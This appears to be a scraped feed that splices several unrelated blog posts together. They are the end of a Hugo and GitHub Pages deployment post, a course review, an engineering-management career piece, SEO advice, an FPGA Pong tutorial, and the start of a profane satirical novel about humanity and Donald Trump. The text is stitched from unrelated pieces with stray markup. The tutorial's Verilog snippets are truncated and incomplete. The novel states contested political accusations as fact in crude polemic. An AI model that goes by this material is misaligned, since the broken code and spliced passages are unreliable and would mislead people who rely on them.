<ol>
<li>Downloads the <code>hugo</code> binary</li>
<li>Builds the site from source with <code>hugo</code></li>
<li>Pushes the build to the <code>gh-pages</code> branch</li>
</ol>
<p>And that’s it, every push of my website source code immediately triggers a build and deployment, all for free.</p>
<p>Here is my configuration for reference:</p>


<h2 id="thats-it-we-have-a-website">That’s it, we have a website</h2>
<p>It really is this simple to build your own custom corner of the internet and serve it for free. I left out some details, specifically my configuration in Cloudflare, but if there is demand I can dive deeper into it.</p>
<h2 id="less-javascript">Less JavaScript</h2>
<p>I hope you’ll join me in adding less unnecessary JavaScript to the internet. It will make you a stronger web developer, and your websites are nearly guaranteed to be faster. There are still of course valid use cases for JavaScript, and perhaps I will explore this topic more in the future as well.</p>

<![CDATA[Seth Godin's the Marketing Seminar Review]]>

August 14, 2020 | https://brendancahill.io/resources/themarketingseminar | <a href="https://web.archive.org/web/*/https://brendancahill.io/resources/themarketingseminar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4c2bf5f3f9d470fa7504"><div><p><strong>The Marketing Seminar (TMS)</strong></p><p>Last Fall I did Seth Godin’s <a href="https://themarketingseminar.com/"><span>This Is Marketing Seminar</span></a>. I was on the fence about going in on this course. I had taken a few courses previously for hefty sums of money that didn’t pan out but after continually reusing the lessons Seth taught in this course over the past year, I can say truly it is 10X more valuable than the price they charge for it.&nbsp;</p><p>I think one of the biggest problems with learning online today is ensuring quality control. Any shmo can slap together a course, market it and sell it, but it is the nature of learning to not truly know if it was <em>worth</em> it until after you’ve completed the experience. Yet, the team at Akimbo and Seth worked hard to create an online community that was not just about learning but engagement.&nbsp;</p><p>Here is my review of it. Enjoy.&nbsp;</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597442244962_4307"><div><p><strong>Here is what TMS did well:</strong></p><ol data-rte-list="default"><li><p><strong>Action Oriented:</strong> Seth and Akimbo designed a course architecture where it was basically impossible for you <em>not</em> to take some type of action daily, and per course. I suggest, if you take this course, to create a dedicated Google Drive folder with each module’s work that you upload.&nbsp;</p></li><li><p><strong>Platform Performance: </strong>The platform used was <a href="https://www.discourse.org/about"><span>Discourse</span></a>. Until TMS I had never come across them but Discourse provided ways to comment, communicate, award participation, offer personal connection and breakout groups in ways that were easier to navigate than I expected.&nbsp;</p></li><li><p><strong>Deep Dives: </strong>TMS is largely based off of Seth’s book <em>This is Marketing</em> but each module is a deep dive down a marketing rabbit hole mentioned in his book. I guess you can think of <a href="https://www.amazon.com/dp/B07DBR1V9S/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1"><span><em>This is Marketing</em></span></a> as this course’s assigned textbook (although you need not have read it).&nbsp;</p></li><li><p><strong>Moderators/Coaches:</strong> While Seth personally hops in from time to time to host office hours, the real coaching came in the form of Seth’s moderators that the course deputized to help stir debate, push thinking and ensure all students’ work received some type of feedback each time. Naturally, given the 80/20 rule not all posts are going to stir lively debate. These coaches were my favorite part.&nbsp;</p></li><li><p><strong>Material:</strong> The material was accessible for about six months after the course had initially finished. I found myself going back over into the course material numerous times as I applied what I was learning to my business and job. I think Seth could easily charge money for continual access to the course materials for alumni like myself and I’d gladly pay.&nbsp;</p></li><li><p><strong>ROI:</strong> Seth and TMS can’t take action for you, but they can make you feel like you’re not alone and supported. In the months during and after the course I found my business network and revenue grew in proportion to the amount of TMS ideas I rolled out. Is that the case with everyone? Not necessarily. But ROI is a combination of how much action one is willing to take plus timing. Action is the only one of these two you can control.&nbsp;</p></li><li><p><strong>Crystal Clear Directions:</strong> Learning how to use Discourse, navigate the platform, course material and course culture all at once can be daunting. People don’t like to feel afraid. They like to feel smart. Seth’s team covers every atomic bit of how-to information in getting you set up to participate fully in this course.&nbsp;</p></li></ol><p><strong>What I could have done better</strong><br></p><ol data-rte-list="default"><li><p><strong>Consistency</strong>: I would post in sporadic bursts, writing tombs sometimes and other times not visiting in on the discussion board for a week or so at a time. I would fall out of the loop with threads that I had commented on and would find it tough to get back into a posting rhythm.&nbsp;</p></li><li><p><strong>Vision</strong>: I didn’t start TMS with a clear goal for how I wanted it to help in my job or business. While this helped me be more open about the course material, I think I lost focus without having a clear goal to work towards.&nbsp;</p></li><li><p><strong>Connection</strong>: I didn’t take even 1% advantage of “finding the others” with shared interests in the course like me. Using Discourse it would have been easy, looking back, to have found a few folks geographically close with similar interests to build friendships with. Looking back, most of the value of this course is that Seth has aggregated 100+ people <em>just like you</em> in some way. All you need to do is say hi.&nbsp;</p></li><li><p><strong>Saving My Work</strong>: You do lose access to the course materials after about six months after completion of the course. And, initially I did a good job of keeping records of my work, I did fall off about halfway through the course, not in work ethic, but in just keeping things organized.&nbsp;</p></li></ol><p><strong>Why might you consider The Marketing Seminar?</strong></p><ol data-rte-list="default"><li><p><strong>If you’re an entrepreneur:</strong> This course will give you the fire power to position your brand to reach the people that you want to reach. It will force you to clearly think about who you are for, who you are not for, the change you are promising, and the story your product needs to tell.&nbsp;</p></li><li><p><strong>If you’re an employee:</strong> This course will give you all the tools you need to better market <em>yourself</em> as a change agent within your organization, how to tell a better story about your vision, resonate with your superiors, build trust and take your next career steps. If you think about the decision makers in most organizations, they possess the best marketing skills.&nbsp;</p></li><li><p><strong>If you feel stuck:</strong> If you are a solopreneur (most of this audience) it is easy to feel stale and stuck. TMS will reinvigorate your business planning with more ideas that you will know what to do with. It will help you see your business is a different like. It will help you become more empathic towards those you seek to serve. And, most of all, it will help you believe in your own work.&nbsp;</p></li></ol><p><strong>The Most Important Person To Market To</strong></p><p>The irony of marketing is that the most important person to market to is you, the marketer. “Drowning people make lousy lifeguards”, as Seth would say, and so it is hard to feel like you are performing a generous act towards another person when marketing if you aren’t feeling generous towards yourself.&nbsp;</p><p>The real magic of The Marketing Seminar is that in crafting the narrative of your business you are simultaneously crafting the narrative that you wish to live your life by. Similar to the narrative of your business, you can change the narrative of your life at any point. Seth just shows you how.&nbsp;</p><p>Bren</p><p>P.S. I am not affiliated in anyway with The Marketing Seminar. I just believe it’s a great product. </p></div></div></div>]]>

<p>How do you end up being one of those people that manages managers?&nbsp;</p>



<p>This is the beginning of a <a href="https://www.theengineeringmanager.com/managing-managers/">series of articles</a> looking at how you can start working on progressing up the management track beyond an <a href="https://www.theengineeringmanager.com/management-101/">Engineering Manager</a>, and into the world of important-sounding job titles. And meetings. Don’t forget meetings. There’s lots of those.</p>



<p>But those job titles, huh?&nbsp;</p>



<p>You may have looked at roles such as <a href="https://docs.google.com/spreadsheets/d/1weNoeSUfHYOHy9sHKad_ax6qrVXNFlP4ieTwaRll70M/edit#gid=1999769114">Director of Engineering or VP Engineering</a> from afar and imagined just how prestigious it must be to see it shining at the bottom of your email signature as you send a terse and impactful decision to your large organization.</p>



<blockquote><p><em>Yes. Let’s commit to this.</em></p><p><em>——</em></p><p><em>A. Genius, PhD</em></p><p><em>Senior Vice President of Data Science and Engineering</em></p></blockquote>



<p>Maybe you’ve even edited your Twitter profile to see what it would look like in your bio. Don’t worry, we’ve all done it. Hopefully you didn’t accidentally hit save.</p>



<p>Anyway, to that question. How do <em>you</em> get one of these roles?</p>



<p>No doubt you’ve seen <em>Director of…</em>, <em>Head of…</em>, and <em>VP</em> roles advertised externally, especially at large software companies. However, often there’s a Catch-22 situation that you’ll face: they’re typically looking for people who have had experience in doing it before. Or even if they say that they aren’t, what chance are you going to have in the recruitment process if you’re up against others who’ve been there and done that? Now, of course, you might get lucky. But maybe there are ways of preparing to make yourself even more lucky.</p>



<p>Let’s think about getting yourself prepared for making the leap to managing managers. I believe that you stand the most chance of being able to make the next progression step if you find yourself at the union of a majority of the following characteristics and situations:</p>



<ul><li><strong>You’ve been an Engineering Manager for a decent amount of time</strong> (say, 2-5 years) and have a provable track record of shipping and people management, with references that can back you up. After all, if you’re going to be running multiple teams, you’re going to need to know how to run one team inside out. (If you’re still working on that, there’s plenty of material on the rest of this site to help you skill up.)</li><li><strong>You’re already working for a company with a strong management culture</strong> that has clear career progression tracks for managers as well as individual contributors. This means that if the role opens up where you already work, it’s clear how to put yourself forward for it. It’ll also mean you’re learning and practicing the right skills.</li><li><strong>You’re at a company that is changing fast</strong> and has a tendency to not quite be able to keep up with the chaos. This often occurs during periods of rapid growth, or even via shake-up – through downsizing, mergers and acquisitions – any event that begins to question the current shape of the org chart being correct for the foreseeable future.</li><li><strong>You have a good presence online</strong> via the usual social channels: LinkedIn, Twitter, Github, and so on. This way if people are trying to find people like you elsewhere, then they can.</li></ul>



<p>Now, of course, it is entirely plausible that you may apply cold for a Director of Engineering role as an external applicant whilst currently being an Engineering Manager. That’s what I meant by getting lucky above. Quite often more senior engineering management positions are either specifically headhunted or promoted from within.&nbsp;</p>



<p>But why is this?</p>



<ul><li><strong>The more senior the managerial position, the more risky a bad hire is</strong>. That’s why excellent internal candidates always have the upper hand: they are a known entity that likely already has domain knowledge. They’re also far more likely to have the company take a chance on the new gig working out. Even better: smart companies will do a 30-60-90 plan that allows the promoted member of staff to revert back to their old role amicably if it’s not working out.</li><li><strong>Good companies will look out for their own staff first</strong> and seize opportunities to offer career progression in order to retain existing talent. I don’t have any statistics on how many manager of manager roles that get filled and are never advertised externally, but I’d reckon it’s maybe in the 70%+ region. If you hire good people consistently, you’ll always have someone great progressing up through the ranks. Why look elsewhere, unless you specifically need to bring in someone specific, such as a candidate with key domain knowledge that is lacking at the company?</li><li><strong>The need to find a manager of managers (in my experience) is rarely something that undergoes extensive planning</strong>. During periods of rapid growth, the number of staff in the department may start stacking up to the point that existing teams need to be split into smaller ones, thus greating opportunities for a node in the org chart above those teams. Sometimes an existing manager of managers will quit and filling that void internally, on a tight timeline, is much easier than reaching outside of the company. Or perhaps two organizations merging together create a bunch of empty nodes in the org chart needing urgently to be filled. Often you look within.</li></ul>



<p>These are all opportunities that you can more likely seize if you make sure you’re already working for an ambitious, high growth company and are doing a stellar job of running a team. This is no small feat in itself, mind you.</p>



<p>Start-ups, or smaller high growth companies in general, are great for giving yourself this opportunity, especially ones that have just received a new venture capital investment. An injection of money means an injection of people, and that then creates more opportunities for leading them as the org chart adapts. <a href="https://www.theengineeringmanager.com/book/">I advocated strongly for the managerial opportunities that high growth start-ups can offer you in the penultimate chapter of my book</a>. After all, how do you reckon many CTOs became CTOs for the first time?</p>



<p>So where am I going with this? To use the cheesiest quote, you’ve gotta skate where the puck is going. (Thanks Wayne.) Yes, you can keep an eye on external adverts and apply to anything and everything and hope that you land the job. However, depending on where you currently work, it may be more fruitful to change role sooner at your <em>current</em> level – which is often easier – in order to stand more of a chance of upward growth over time.</p>



<p>There are parallels here with the early stages of an individual contributor’s career. It’s often really hard to land that first job because the applicant has yet to be able to prove themselves. However, once they’ve stuck around for a few years and have gained experience by shipping lots of code, they find themselves having to bat the recruiters away.</p>



<p>The exact same thing is true about progressing further up the management track. Getting your first management role is tough, but you only have to do it once to prove you can do it again. The same is true about the next step of managing managers. People often grow from within by being excellent performers and then working their way upwards.</p>



<p>If you’re looking to grow from managing individual contributors to managing managers, have a think about the following points.</p>



<ul><li><strong>How likely is it that this will be possible at your current company within a reasonable timeframe?</strong> If it’s not, you might need to look elsewhere sooner rather than later.</li><li><strong>Is your current Engineering Manager role defined similarly to how other notable companies in the industry define it?</strong> If not, why not? The more your current EM role fits that of the best employers in the industry, the better chance you have of moving sideways and upwards.</li><li><strong>How many years of experience in this role do you have?</strong> I would expect a manager of managers to be a high growth EM with at least a few years of tenure.</li><li><strong>What notable infrastructure, features or products have you shipped whilst being an EM?&nbsp;</strong></li><li><strong>Are you seen as an influential person in your current department?</strong> Do people outside your team seek your advice? If not, why not?</li><li><strong>Have you coached anyone outside of your team?</strong> If not, then I’d advise you to start giving it a go.</li><li><strong>Have you found anyone else doing this role, either in your existing company, your network or online?</strong> Get in touch with them to see if they’ll have a chat with you about what it’s like to do that job, and ask them how they got into it. What changed for them when compared to just running one team? What happened to their time to contribute technically? </li></ul>



<p>What’s your current story? Does it feel like you’re ready for the next step? Have you already been working at the level of your next promotion?</p>



<p>If you’re not familiar with the management career progression path in general then you can check out the career tracks of other companies, <a href="https://docs.google.com/spreadsheets/u/1/d/1weNoeSUfHYOHy9sHKad_ax6qrVXNFlP4ieTwaRll70M/edit#gid=1999769114">including our own</a> from Brandwatch, on <a href="https://www.progression.fyi/">progression.fyi</a>.</p>



<p>If you’re seeking out others to talk to about it, then you could use LinkedIn, Twitter, or Slack communities such as <a href="https://lead-dev-slack.herokuapp.com/">The Lead Developer</a>, <a href="https://ctocraft.com/community/">CTO Craft,</a> or the <a href="https://randsinrepose.com/welcome-to-rands-leadership-slack/">Rands’ Leadership group</a> to do so. </p>



<p>While you ruminate on these, I’ll be expanding out my own thoughts and experiences of doing the job for a number of years in the forthcoming series of articles that I’ll be hosting under the <a href="https://www.theengineeringmanager.com/managing-managers/">Managing Managers</a> section of the website.</p>



<p>Until the next one, good luck!&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Over the years, I've worked on building search traffic for two kinds of sites.</p> <p>The first, was working for companies that already had hundreds of thousands or millions of monthly users and were trying to build their traffic via a team of writers. I did this first for Verbling (as a side component to my work as a full-time dev), and then later for Codementor, as a remote growth consultant.</p> <p>The second, was my own sites or apps where 100% of the content was produced by me. I've also helped several other independent solo-founders do essentially the same for their own projects. Today's advice is for 2nd type of site—the ones with just one writer.</p> <p>For a quick point of reference, I'll what I'm currently working on so you can get an idea of how applicable my experience is or isn't to you:  <a href="https://alchemist.camp/" target="_blank" rel="noopener noreferrer">Alchemist Camp</a>. It targets an extremely small programming niche and is hovering around Alexa 700k (10-15k uniques/month with decent visit time). I add new content about once a week. Previously, I built a considerably larger personal blog that peaked at about Alexa 300k, but it's no longer up.</p> <h2 id="work-with-the-search-engine"><a href="#work-with-the-search-engine">#</a> Work <em>with</em> the search engine</h2> <p>There's a lot of competition for attention from search engines and an entire industry of people trying to game them. It's possible to do that successfully in the short term, but people who do that generally get crushed when new search ranking updates. The more egregious marketers sometimes get penalized or banned entirely.</p> <p>There are certain technical SEO basics to pay attention to, such as having a reasonable site structure, a sitemap and appropriate meta-tags. I'm going to assume you've got that covered. WordPress or any other modern CMS will do an adequate job out of the box.</p> <p>So with the above assumptions, what's a good way to cut through the competition?</p> <h2 id="pay-attention-when-a-search-is-frustrating"><a href="#pay-attention-when-a-search-is-frustrating">#</a> Pay attention when a search is frustrating</h2> <p>The single most successful strategy I've found for getting search engine traffic for a more niche site has been to pay very close attention when something is difficult to find online. This isn't very difficult to do, since it's easy to notice when something is frustrating. The key is to be aware and take notes.</p> <p>Look at your browser history and write down <em>the exact queries</em> you typed into Google, Duckduckgo or your search engine of choice. Ask yourself <em>what</em> you were hoping to find online and why you tried each query after the first.</p> <h2 id="create-what-you-hoped-your-search-would-find"><a href="#create-what-you-hoped-your-search-would-find">#</a> Create what you hoped your search would find</h2> <p>Then, after you've learned what you were trying to learn during your frustrating search, create the very thing you were trying to find.</p> <p>Usually a search is difficult because the ideal answer doesn't exist in a single document online or video. Instead, finding the answer involves piecing the information together from numerous sources. If that was the case with your frustrating search, then the next step is to create the answer to the search and publish it.</p> <p>Occasionally after a long and frustrating search, you <em>will</em> find a single resource that answers exactly what you wanted. In this case the question is, "Why didn't my first several searches return this document?" Maybe it used different terminology than you did. Maybe it was comment on an ancient forum post. Maybe it was on an extremely slow site. Make your own version of the resource you finally found, but fix whatever issue made it difficult to find.</p> <h3 id="an-example"><a href="#an-example">#</a> An example</h3> <p>One direct example of using this strategy was when it took me about 20 minutes of searching to find out how to do a certain kind of query with Elixir's main DB-related library, Ecto. Elixir maps are stored in Postgres as JSONB fields, and I wanted to query fields within the JSONB.</p> <p>I saw I'd made 8 searches, starting with <em>"query nested fields of a map ecto"</em>. Ultimately the whole answer to what I was looking for was split between a Thoughtbot post, a Stack Overflow answer and a Postgres documentation page.</p> <p>Then I wrote a short article called, <a href="https://alchemist.camp/articles/querying-nested-map-ecto" target="_blank" rel="noopener noreferrer">Querying nested fields of a map with Ecto</a> that contained exactly the information I'd been looking for, and it's since brought in a thousand visitors from search in under a year.</p> <h2 id="why-does-this-work"><a href="#why-does-this-work">#</a> Why does this work?</h2> <p>This strategy tends to be stable because it works with the search engine and doesn't tend to get crushed by updates the way more aggressive techniques do. It leads to creating genuinely helpful resources for people to find online and Google has every incentive to return them in its results.</p> <p>Content created this way tends to rank well because the entire strategy revolves around escaping competition. If there is a lot of competition around a query, it's generally well-answered and you'll find an adequate (though possibly spammy, advertising-stuffed) result within a search or two. The searches that are <em>really</em> frustrating are usually not going to have much competition.</p> <p>Unless your interests are <strong>truly</strong> rare, others will search for what you did and find your page.</p>  <br></div></div>]]>

      <p>Welcome back to <em>Exploring FPGA Graphics</em> with Project F. In this series, we’ll be experimenting with FPGA graphics of all kinds, from a simple square, through Pong, sprites, and the Mandelbrot set, to 2D drawing, and even simple 3D modelling. New to the series? Start with <a href="https://projectf.io/posts/fpga-graphics/">Exploring FPGA Graphics</a>.</p>
<p>In the previous part, we got an <a href="https://projectf.io/posts/fpga-graphics/">introduction to FPGA graphics</a>, now we’re ready to put our graphical skills to work, by recreating the arcade classic: Pong.</p>
<p><em>Revised 2020-08-14. Get in touch with <a href="https://twitter.com/WillFlux">@WillFlux</a> or open an <a href="https://github.com/projf/projf-explore/issues">issue on GitHub</a>.</em></p>
<h3 id="requirements">Requirements</h3>
<p>For this series, you need an FPGA board with video output. We’ll be working at 640x480, so pretty much any video output will do. You should be comfortable with programming your FPGA board and reasonably familiar with Verilog.</p>
<p>We’ll be demoing with these boards (FPGA type):</p>
<ul>
<li><strong><a href="https://github.com/icebreaker-fpga/icebreaker">iCEBreaker</a></strong> (Lattice iCE40) with <strong><a href="https://github.com/icebreaker-fpga/icebreaker">12-Bit DVI Pmod</a></strong></li>
<li><strong><a href="https://reference.digilentinc.com/reference/programmable-logic/arty-a7/reference-manual">Digilent Arty A7-35T</a></strong> (Xilinx XC7) with <strong><a href="https://reference.digilentinc.com/reference/pmod/pmodvga/reference-manual">Pmod VGA</a></strong>
<ul>
<li>The Arty version of Pong is still being tested and will be released soon</li>
</ul>
</li>
</ul>
<p>Follow the source <a href="https://github.com/projf/projf-explore/tree/master/fpga-pong">README</a> to quickly build a project for either of these boards.</p>
<blockquote>
<p><strong>iCEBreaker with VGA Pmod</strong><br>
The first part of this series included VGA designs for iCEBreaker. Maintaining three sets of designs was a significant overhead, so the iCEBreaker VGA version has been dropped from the examples.</p>
</blockquote>
<h3 id="source">Source</h3>
<p>All the Verilog designs featured in this series are available in the <a href="https://github.com/projf/projf-explore/">Exploring FPGAs repo</a>, and source links are included throughout the blog. The designs are open source under the permissive MIT licence, but this blog is subject to normal copyright restrictions.</p>

<p><strong>Pong</strong> may not have been the first computer game, but it has an excellent claim to being the first to break into public consciousness when it was released in 1972. Originally an arcade cabinet, it was quickly adapted to be played at home attached to a television. If you’d like to learn more about the early history of Atari, including Pong, I recommend <em><a href="https://mitpress.mit.edu/books/racing-beam">Racing the Beam</a></em> by Nick Montfort and Ian Bogost.</p>
<p><em>ProTip: If you’re unfamiliar with Pong gameplay, check out this <a href="https://www.youtube.com/watch?v=it0sf4CMDeM">Pong video</a> on YouTube.</em></p>
<h2 id="ball--paddles">Ball &amp; Paddles</h2>
<p>In the <a href="https://projectf.io/posts/fpga-graphics/">previous part</a> of this series, we learnt how to draw animated squares and perform collision detection. This gives us all we need to implement a square Pong ball:</p>
<div><pre><code data-lang="verilog">    <span>localparam</span> B_SIZE <span>=</span> <span>8</span>;          <span>// size in pixels

<h3 id="pong-v1">Pong v1</h3>
<p>We can use the ball and paddle logic to create a first version of the top module for Pong:</p>

<li>Xilinx XC7: <em>coming soon</em></li>
<li>Lattice iCE40: <strong><a href="https://github.com/projf/projf-explore/blob/master/fpga-pong/ice40/top_pong_v1.sv">ice40/top_pong_v1.sv</a></strong></li>
</ul>
<p>To build this example, you’ll also need the display timings, clock generation, and constraints, that we created in the first part of the series. All these files are available in the <a href="https://github.com/projf/projf-explore/tree/master/fpga-pong">FPGA Pong repo</a> together with a makefile for iCEBreaker, and Vivado project for Arty.</p>
<h2 id="collision">Collision</h2>
<p>It’s briefly fun to watch the ball crawl around the screen with the paddles, but this isn’t exactly a game, even a demo of one: the ball shows a blatant disregard for the paddles.</p>
<p>To test for paddle collision, we take advantage of the drawing signals: if we’re drawing the ball and a paddle at the same time, then there’s a collision. The collision occurs during the drawing process, so we need to store it and use it when we next animate.</p>
<div><pre><code data-lang="verilog"><span>logic</span> p1_col, p2_col;
<span>always_ff</span> @(<span>posedge</span> clk_pix) <span>begin</span>

<h2 id="controls">Controls</h2>
<p>So far the FPGA has been playing against itself. If you want to get in on the action, we need to add some controls. We’re going to use three buttons: up, control, and down.</p>
<p>Add the buttons to the top module ports:</p>
<div><pre><code data-lang="verilog">    <span>input</span>  <span>wire</span> <span>logic</span> btn_up,       <span>// up button

</span><span></span>    <span>input</span>  <span>wire</span> <span>logic</span> btn_dn,       <span>// down button
</span></code></pre></div><p>We need to map these buttons to FPGA pins in the constraints file. You’ll be happy to hear I’ve already done this for you:</p>
<ul>

</ul>
<p>To safely use buttons in our design, we need to debounce them. Debouncing ensures we get a single, clean, transition from button presses. The debounce module looks like this:</p>
<div><pre><code data-lang="verilog"><span>module</span> debounce (
    <span>input</span>  <span>wire</span> <span>logic</span> clk,  <span>// clock

</span><span></span>    <span>output</span>      <span>logic</span> out,  <span>// signal output (debounced)
</span><span></span>    <span>output</span>      <span>logic</span> ondn, <span>// on down (one tick)
</span><span></span>    <span>output</span>      <span>logic</span> onup  <span>// on up (one tick)
</span><span></span>    );

    <span>end</span>

    <span>always_ff</span> @(<span>posedge</span> clk) <span>begin</span>

        <span>end</span>
    <span>end</span>
<span>endmodule</span>
</code></pre></div><p>We want continuous signals for up and down, but a one-off event for the control button:</p>
<div><pre><code data-lang="verilog">    <span>logic</span> sig_ctrl, move_up, move_dn;
    debounce deb_btn_ctrl (.clk(clk_pix), .in(btn_ctrl), .out(), .ondn(), .onup(sig_ctrl));
    debounce deb_btn_up (.clk(clk_pix), .in(btn_up), .out(move_up), .ondn(), .onup());
    debounce deb_btn_dn (.clk(clk_pix), .in(btn_dn), .out(move_dn), .ondn(), .onup());
</code></pre></div><p>The <code>onup()</code> and <code>ondown()</code> outputs work like traditional UI events. In this case, <code>sig_ctrl</code> will be high for one tick when the control button is released.</p>
<p>We start with two states:</p>
<ul>
<li><strong>IDLE</strong> - both paddles are controlled by the AI (demo)</li>
<li><strong>PLAY</strong> - enable player paddle</li>
</ul>
<p>Pressing the control button switches between these states, while the up and down buttons are used to control the paddle.</p>

<p><strong>A Very Good Novel (Coronavirus)</strong></p>
<p><em>by Christopher Damitio</em></p>

<p><em><strong>Prologue – A History of the World and Her Apes</strong></em></p>
<p>Once upon a time there was a beautiful planet filled with chaotic and beautiful landscapes, flora, fauna, and amazing oceanic and geologic events. Things pretty much went the way things go on any planet with life – there were good times, there were bad times, there were mass extinctions, there were cataclysmic events that included but were not limited to meteors, tsunamis, volcanoes, earthquakes, ice ages, and much more. And so it went…</p>
<p>The planet produced life in abundance – and killed that life in abundance. Sometimes the planet used one form of life to kill other forms of life. Sometimes, the planet took a break and simply enjoyed a necessary state of homeostasis.</p>
<p>It was during one of these periods of restful equilibrium that the monkeys and apes started fucking things up. It’s a long story and it’s been told many times – I don’t want to bore you with all the details so I’m going to summarize it in as little space as possible.</p>
<p><em>Purgatoria</em> were built to fuck. They fucked and they fucked and they fucked. As a result of always fucking and always looking for something else to fuck – these little fuckers spread throughout Eurasia and Africa and became the common ancestor for all of the family of animals known as primates. The primates all kept their ancestor’s proclivities for making new descendants and also for filling pretty much any unoccupied ecological niche they might come across. This led to the diversity of primates knows as lemurs, lorises, bush babies, tarsiers, old world monkeys, new world monkeys, and apes. While each of those branches is interesting, it’s the apes we will focus on because they also kept doing what they did best – which eventually led to many different &nbsp;species of ‘human’ living at the same emergent time. This was all in the blink of the planet’s eye, so she didn’t really notice.</p>
<p>The human species interbred, migrated, adapted, and began to fight for space. A particularly nasty branch of the humans fucked, killed, ate, and exterminated all the other branches. Bye bye <em>Homo habilis, Homo rudolfensis, Homo erectus, Homo heidelbergensis, Homo rhodesiensis, Neanderthal, Denisovan, Homo florensis,</em> and <em>Homo luzonensis</em> – and hello <em>Homo sapiens</em> – the one and only survivor of the great human wars. There can only be one – at least there can only be one if the winner is Homo sapiens because these things were the most illogical and selfish creatures that planet had ever spawned.</p>
<p>Oh, I can hear you right now…but wait, I’m one of those – you (me) you’re one of those! We’re not so bad. Think about Martin Luther King and Jesus and Helen Keller and ….</p>
<p>Okay, yes, I admit it. Some of us, some humans are good – but unfortunately, that is a weak aberration from the species norm, not the default setting. Those good humans – they deserve to be worshipped, revered, and treated with respect – listened to. It’s true, there are some very very very very very good humans – and they usually get killed by the others, then, when they are dead their message or their life is twisted around and used to help some other human either literally or metaphorically fuck as many other humans as possible. In truth, the only thing that kept the human species going was the fact that they loved to fuck so much – and the natural result of that was more humans and since they didn’t blink at incest for most of their existence, they didn’t blink at any atrocity that most other animals avoided – in fact – they became progressively more and more brutal, vicious, and conniving, while also becoming completely insane and – frankly – fucking evil. Humans were evil.</p>
<p>In the space of a few thousand years they wiped out the other human species, created huge tribal empires, dehumanized each other, normalized enslaving and committing genocide upon one another, and developed mad genius processes that included but were not limited to chemical warfare, nuclear warfare, wage slavery, corporate capitalism, and industrial production paired with military conquest. These were things that no sane animal would think of – but, as we’ve established – these were not rational animals – they were completely and totally fucking insane.</p>
<p>So, moving on – they poisoned rivers, lakes, oceans, the sky, the land, and each other. They literally shit where they ate over and over and then coined phrases of remarkable wisdom such as ‘Don’t shit where you eat”. They leveled mountains, flattened forests, exterminated entire species, caged everything they could, enslaved each other using chains, whips, guns, technology, and psychological techniques – and – and this is the amazing part – the whole while they were doing this they were patting themselves on the back and congratulating themselves on ‘progress’. &nbsp;They wrote declarations and manifestos and they declared human rights and universal brotherhood – and all the whole they came up with new ways to stick it to each other.</p>
<p>Jesus and Buddha and others came and said wise things that generally came down to “Don’t treat each other like shit because you don’t want to be treated like shit and neither does anyone else”. Jesus got nailed to some sticks and Buddha got fed some rancid meat. JP Morgan came along and said “Hey, these guns are really cheap and they blow up in your face if you try to shoot them, but I can buy them cheap and sell them to the people fighting against slavery (but really most of them were probably fighting for other reasons – but let’s not go there) and make a huge profit.” And he did, and the people worshipped him for it, just as they had worshipped the slave owning traitor who founded their country and all the tyrants, kings, dictators, and despots of the past.</p>
<p>Yes, I hear you again “Slave owning traitor? You mean the founder of the United States? General George Washington?” Yes, a man who bought and sold other humans and swore an oath more than once to support the King of England and then betrayed that oath and led an uprising so he could make more profit and buy more slaves.</p>
<p>In any event, I don’t mean to pick on ‘General’ Washington. He was no worse than most of the other power hungry men around him and considerably better than many – depending on how you define the term better. &nbsp;In any event, he started a country, defined a way of rule and made sure that the power stayed in his court – until he was pretty sure that the power he had was secure – then he nobly stepped away.</p>
<p>For the next two hundred and forty four years his country ran with a charade that they were the defenders of man, the beacon of liberty, and the bastion of hope and democracy. All the while, his country was enslaving, committing genocide, breaking treaties, stealing land, raping, pillaging, and figuring out new ways to do all of the above without sounding like the bad guy. If ever there was a winner of the war on hearts and minds, it was the United States of America from about 1776-2016. Even when they fought wars for made up reasons or invaded countries to take their resources – the USA always was able to justify itself as the ‘policeman of the world’ or the ‘defender of democracy’ – which is pretty funny if you think about it and ignore the millions of dead and suffering that came from it. The USA developed the atomic bomb and even though the war was more or less over – dropped a couple of them on Japan, just to make sure they knew they had lost – the 100,000 killed in the firebombing of Tokyo just wasn’t enough.</p>
<p>I could go on – I could justify what I am saying, I could point to sources and references – but justification is one of the things we do best and if you don’t want to agree with me, I have confidence that your ability to justify your position will be at least equal to my ability to justify mine. Humans can steal from a poor person (a person much poorer than themselves) and then find a good reason for why that was the right thing to do. It’s amazing and it’s true – so I will quit trying to justify. I don’t want to get bogged down in Vietnam, Iraq, or Afghanistan – I want to tell my story.</p>
<p>Technology and corporate capitalism created a perfect storm for total human control. It was easy to convince almost all of the humans that they deserved to have a better life than all of the other humans. It was easy to convince almost all of those humans that they had a chance to have a better life than all of those other humans. And with that done – it was easy to get all the humans to point their fingers at each other and blame those with less power than themselves for them not having as much power as they wanted.</p>
<p>Social media and data analytics made it easy to manipulate huge swaths of the population. The bizarre result was millions of poor people voting for an exploitive billionaire, millions of ‘business people’ voting for a business person who had lost far more than he had created, millions of ‘Christians’ to vote for the least Christian person ever, millions of Jewish people to vote for a guy who repeatedly made Nazi references, and millions of women to vote for a rapist.</p>
<p>In truth, Donald John Trump, was the pinnacle of human evolution. He was everything that humans had been heading towards since those long ago days when multiple human species were clubbed to death by Homo sapiens. If ever there was a perfect example of humanity, Trump was it. And after the election of 2016, he finally took his place as the most powerful primate in the world. One thing was certain, he was never going to let go of that power.</p>
<p><strong><em>Chapter 1 – The Pinnacle of Human Evolution and Conceit</em></strong></p>
<p>Donald Trump was sitting on top of the world. He was the most powerful human being in the history of planet earth. &nbsp;He controlled enough nuclear weapons to …</p></div></article></div>

